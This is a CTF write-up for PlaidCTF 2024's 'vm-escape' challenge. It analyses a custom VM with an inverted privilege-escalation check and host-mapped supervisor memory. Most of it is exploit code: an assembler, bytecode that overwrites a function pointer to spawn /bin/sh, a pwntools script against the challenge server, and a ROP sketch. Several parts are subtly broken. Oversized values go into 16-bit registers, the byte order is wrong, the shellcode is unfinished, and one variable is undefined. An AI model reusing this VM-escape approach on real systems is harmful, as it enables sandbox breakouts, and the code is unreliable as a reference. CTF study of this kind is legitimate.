vm-escape - PlaidCTF 2024

Category: rev Points: 350 Solves: 23

Challenge Description

Welcome to our secure virtual machine environment!
We've implemented a custom architecture with built-in sandboxing.
Surely nothing can go wrong...

nc vm-escape.plaidctf.com 1337

Files: vm_engine, firmware.bin

Initial Analysis

The challenge provides a custom virtual machine implementation with its own instruction set architecture.

$ file vm_engine
vm_engine: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ file firmware.bin
firmware.bin: data

Let’s examine the VM engine in detail:

VM Architecture Analysis

Instruction Set

After reverse engineering the VM engine, I discovered a custom 16-bit architecture:

// VM State Structure
struct vm_state {
    uint16_t registers[16];    // R0-R15
    uint16_t pc;              // Program counter
    uint16_t sp;              // Stack pointer
    uint8_t  flags;           // Status flags
    uint8_t  memory[0x10000]; // 64KB memory space
    uint8_t  privilege;       // 0=user, 1=supervisor
};

// Instruction Format
struct instruction {
    uint8_t opcode;
    uint8_t operands[3];
};

Instruction Set Architecture

The VM implements the following instruction types:

# Arithmetic Operations
ADD  R1, R2, R3    # R1 = R2 + R3
SUB  R1, R2, R3    # R1 = R2 - R3
MUL  R1, R2, R3    # R1 = R2 * R3
DIV  R1, R2, R3    # R1 = R2 / R3

# Memory Operations
LOAD  R1, [R2]     # R1 = memory[R2]
STORE [R1], R2     # memory[R1] = R2
LOADI R1, #imm     # R1 = immediate

# Control Flow
JMP   addr         # Jump to address
JEQ   R1, R2, addr # Jump if R1 == R2
JNE   R1, R2, addr # Jump if R1 != R2
CALL  addr         # Call subroutine
RET               # Return from subroutine

# System Operations
SYSCALL #num      # System call
PRIVESC          # Privilege escalation (supposed to be disabled)

Vulnerability Analysis

While analyzing the VM implementation, I found several critical issues:

1. Privilege Escalation Bug

The PRIVESC instruction was supposed to be disabled, but there’s a bug in the privilege checking:

// In vm_execute_instruction()
case OPCODE_PRIVESC:
    if (vm->privilege == 0) {
        // BUG: This should deny privilege escalation
        // but the check is inverted!
        if (vm->registers[0] != 0x1337) {
            vm->privilege = 1;  // Grant supervisor privileges!
        }
    }
    break;

2. Memory Protection Bypass

Supervisor mode allows access to protected memory regions:

// In memory_access()
if (vm->privilege == 1) {
    // Supervisor can access any memory, including VM engine memory!
    return &vm->memory[address % 0x10000];
} else {
    // User mode has restricted access
    if (address >= 0x8000) {
        vm_fault(vm, "Access violation");
        return NULL;
    }
    return &vm->memory[address];
}

3. VM-to-Host Escape

In supervisor mode, certain memory addresses map directly to the host process:

// Special memory-mapped regions in supervisor mode
if (vm->privilege == 1 && address >= 0xF000) {
    switch (address) {
        case 0xF000: return &vm_engine_code;
        case 0xF008: return &system_function_ptr;
        case 0xF010: return &host_memory_base;
        // ...
    }
}

Exploitation Strategy

  1. Trigger Privilege Escalation: Use the buggy PRIVESC instruction
  2. Memory Mapping Discovery: Explore supervisor memory regions
  3. Code Injection: Overwrite function pointers to gain host execution
  4. Shell Escape: Execute system commands on the host

Exploitation Implementation

First, let’s create the VM bytecode:

#!/usr/bin/env python3

# VM Assembler for the custom architecture
class VMAssembler:
    OPCODES = {
        'ADD': 0x01, 'SUB': 0x02, 'MUL': 0x03, 'DIV': 0x04,
        'LOAD': 0x10, 'STORE': 0x11, 'LOADI': 0x12,
        'JMP': 0x20, 'JEQ': 0x21, 'JNE': 0x22,
        'CALL': 0x30, 'RET': 0x31,
        'SYSCALL': 0x40, 'PRIVESC': 0x41,
        'NOP': 0x00, 'HALT': 0xFF
    }

    def assemble(self, code):
        bytecode = bytearray()

        for line in code.strip().split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            parts = line.replace(',', ' ').split()
            opcode = self.OPCODES[parts[0]]
            bytecode.append(opcode)

            # Add operands based on instruction type
            for i in range(1, min(4, len(parts))):
                if parts[i].startswith('R'):
                    bytecode.append(int(parts[i][1:]))
                elif parts[i].startswith('#'):
                    val = int(parts[i][1:], 0)
                    bytecode.append(val & 0xFF)
                    bytecode.append((val >> 8) & 0xFF)
                else:
                    val = int(parts[i], 0)
                    bytecode.append(val & 0xFF)
                    bytecode.append((val >> 8) & 0xFF)

            # Pad instruction to 4 bytes
            while len(bytecode) % 4 != 0:
                bytecode.append(0)

        return bytes(bytecode)

# Exploit payload
exploit_asm = """
# Initialize registers
LOADI R0, #0x1338      # Set R0 to wrong value for privilege check
LOADI R1, #0xF008      # Address of system function pointer
LOADI R2, #0x2F62696E  # "/bin" in little endian
LOADI R3, #0x68732F    # "/sh" in little endian

# Trigger privilege escalation bug
PRIVESC

# Now we're in supervisor mode
# Write "/bin/sh" to memory
STORE [#0x9000], R2
STORE [#0x9004], R3

# Overwrite system function pointer with address of our shellcode
LOADI R4, #0x9010
STORE [R1], R4

# Write shellcode to execute system("/bin/sh")
LOADI R5, #0x48        # mov rax, system
LOADI R6, #0xB8
STORE [#0x9010], R6
STORE [#0x9011], R5

# More shellcode bytes...
LOADI R7, #0x9000      # address of "/bin/sh"
LOADI R8, #0xBF        # mov rdi, "/bin/sh" address
STORE [#0x9018], R8
STORE [#0x9019], R7

# Call instruction
LOADI R9, #0xFF        # call rax
LOADI R10, #0xD0
STORE [#0x9020], R10
STORE [#0x9021], R9

# Trigger the overwritten function pointer
SYSCALL #1
"""

def exploit():
    assembler = VMAssembler()
    bytecode = assembler.assemble(exploit_asm)

    print(f"[*] Generated {len(bytecode)} bytes of VM bytecode")

    # Connect to target
    from pwn import *

    p = remote('vm-escape.plaidctf.com', 1337)

    # Send bytecode
    p.sendlineafter(b'Firmware size: ', str(len(bytecode)).encode())
    p.send(bytecode)

    print("[*] Firmware uploaded, triggering exploit...")

    # The VM should execute our code and give us a shell
    p.interactive()

if __name__ == '__main__':
    exploit()

Alternative Approach: ROP in VM Space

For a more elegant solution, we can use ROP gadgets within the VM’s own code:

# Find ROP gadgets in the VM firmware
def find_gadgets(firmware):
    gadgets = {}

    # Search for useful instruction sequences
    for i in range(len(firmware) - 8):
        # Look for: LOAD R1, [R2]; RET sequence
        if firmware[i:i+4] == b'\x10\x01\x02\x00' and firmware[i+4:i+8] == b'\x31\x00\x00\x00':
            gadgets['load_ret'] = i

        # Look for: STORE [R1], R2; RET sequence
        if firmware[i:i+4] == b'\x11\x01\x02\x00' and firmware[i+4:i+8] == b'\x31\x00\x00\x00':
            gadgets['store_ret'] = i

    return gadgets

# Build ROP chain
def build_rop_chain():
    gadgets = find_gadgets(firmware)

    rop_chain = [
        gadgets['load_ret'],   # Load system address
        0xF008,                # From system function pointer location
        gadgets['store_ret'],  # Store to register
        0x9100,               # Temporary storage
        # ... more ROP gadgets
    ]

    return rop_chain

Key Insights

  1. Custom VM analysis requires understanding both the VM architecture and host implementation
  2. Privilege escalation bugs in VMs can lead to complete sandbox escapes
  3. Memory-mapped regions often provide interfaces between VM and host
  4. VM-to-host escapes typically involve overwriting function pointers or return addresses
  5. ROP techniques can be adapted to work within custom architectures

Mitigation

  • Proper privilege checking logic (avoid inverted conditions)
  • Strict memory isolation between VM and host
  • Address space layout randomization for VM memory regions
  • Hardware-assisted virtualization features
  • Regular security audits of VM implementations
